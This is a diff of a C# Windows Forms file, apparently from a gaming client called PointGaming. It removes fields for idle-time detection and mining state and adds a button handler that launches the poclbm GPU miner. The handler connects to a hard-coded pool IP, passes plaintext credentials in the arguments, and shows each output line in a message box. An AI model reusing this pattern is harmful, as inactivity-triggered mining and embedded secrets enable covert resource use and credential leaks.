@@ -24,37 +24,6 @@ namespace PointGaming
 		ApiResponse ar;
 		string firstSelectedItem;
 		FriendStatus fr;
-		[DllImport("User32.dll")]
-		private static extern bool GetLastInputInfo(ref LastInputInfo plii);
-
-		[DllImport("User32.dll")]
-		private static extern int DestroyIcon(IntPtr hIcon);
-
-		internal struct LastInputInfo
-		{
-			public uint cbSize;
-			public uint dwTime;
-		}
-
-		private const int WITHIN_ALLOWED_INACTIVITY_PERIOD = -1;
-		private const int OUTSIDE_ALLOWED_INACTIVITY_PERIOD = 1;
-		private const string POCLBM_DEVICE_MATCH_PATTERN = @"^\[(?<id>\d+)\]\s+(?<device>.*)\b(?:.*)?$";
-
-		private readonly Regex _poclbmOutputHashesPerSecondRegex = new Regex(@"^.*\s\[(?<hps>\d+\.\d+)\s[MmKkTt]H/s.*$");
-
-		private Process _miningProcess;
-		private TimeSpan _startAfterDelay = new TimeSpan(0, 10, 0);
-		private readonly Dictionary<int, string> _openCLDevices;
-		private int _selectedDevice = 0;
-		private bool _dismissedBaloonTip = false;
-		private string _username;
-		private string _password;
-		private Uri _poolAddress;
-		private readonly string _encryptionKey = GetMachineIdentifierForEncryptionKey();
-
-		private Bitmap _trayBitmap = new Bitmap(16, 16);
-		private Graphics _trayGraphic;
-
 
 
 		public frmHome()
@@ -356,7 +325,27 @@ namespace PointGaming
 
 		private void button2_Click(object sender, EventArgs e)
 		{
+			Process poclbm = new Process();
+			poclbm.StartInfo.FileName = "poclbm.exe";
+			poclbm.StartInfo.Arguments = @"http://pointgaming:po\!ntgam\!ng@96.126.125.144:8332 --device=0 --platform=0 --verbose";
+			poclbm.StartInfo.UseShellExecute = false;
+			poclbm.StartInfo.RedirectStandardOutput = true;
+			poclbm.Start();
+			poclbm.OutputDataReceived += new DataReceivedEventHandler(OnDataReceived);
+			Console.WriteLine(poclbm.StandardOutput.ReadToEnd());
 
+			poclbm.WaitForExit();
+		}
+
+		public void OnDataReceived(object sender, DataReceivedEventArgs e)
+		{
+
+			if (e.Data != null)
+			{
+				string temp = (e.Data) + Environment.NewLine;
+				MessageBox.Show(temp);
+
+			}
 		}
 	}
 }
